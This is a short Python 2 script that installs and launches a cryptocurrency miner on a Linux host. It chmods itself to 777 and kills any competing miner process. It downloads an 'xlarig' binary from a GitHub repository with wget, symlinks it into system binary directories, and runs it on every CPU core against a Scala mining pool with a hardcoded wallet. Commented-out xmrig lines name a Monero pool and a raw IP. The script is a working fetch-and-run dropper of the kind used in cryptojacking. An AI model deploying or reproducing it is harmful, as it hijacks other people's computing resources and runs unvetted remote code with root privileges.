__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'xlarig'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count()
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
try:
    if os.path.isfile('/usr/local/bin/' + program) == False:
        os.system('apt-get install -y hwloc')
        os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xlarig')
        os.system('chmod 777 ' + program)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program + ' /usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + program + ' /usr/bin/' + program)
        time.sleep (2)
except:
    pass
#os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
#os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
os.system ('xlarig --donate-level 1 -a defyx -o stratum+tcp://Mine.ScalaProject.io:3333 -u SEiStP7SMy1bvjkWc9dd1t2v1Et5q2DrmaqLqFTQQ9H7JKdZuATcPHUbUL3bRjxzxTDYitHsAPqF8EeCLw3bW8ARe8rYP43BZtL1TXq6Hwg2u+20000 -t ' + str(cores))
